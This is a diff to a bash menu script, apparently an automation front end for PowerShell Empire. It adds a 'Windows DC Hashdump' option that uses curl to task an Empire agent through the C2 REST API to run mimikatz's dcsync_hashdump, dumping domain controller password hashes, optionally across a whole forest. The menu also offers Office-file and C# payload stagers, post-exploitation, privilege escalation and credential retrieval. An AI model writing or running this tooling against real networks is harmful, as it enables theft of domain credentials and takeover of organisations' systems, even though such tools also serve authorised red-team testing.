@@ -1023,8 +1023,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 21=Main Menu | 22=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 22=Main Menu | 23=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1116,7 +1116,14 @@ do
 	done
             echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
             echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
-			;;	
+			;;
+		"Windows DC Hashdump")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Grab Only Active Accounts? True/False ' useractive; read -p 'Grab Entire Forest? True/False ' userforest;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/credentials/mimikatz/dcsync_hashdump?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"Active":'\"$useractive\"',"Forest":'\"$userforest\"'}' >> ~/ATAT/WindowsDC_PSE_postex.log
+	        echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
+			;;
 		"Linux/OSX Post-Exploitation")
     inputfile=~/ATAT/PSE_linux_osx_postex.txt
 	pseauthtoken=~/ATAT/PSE_perm_token.txt
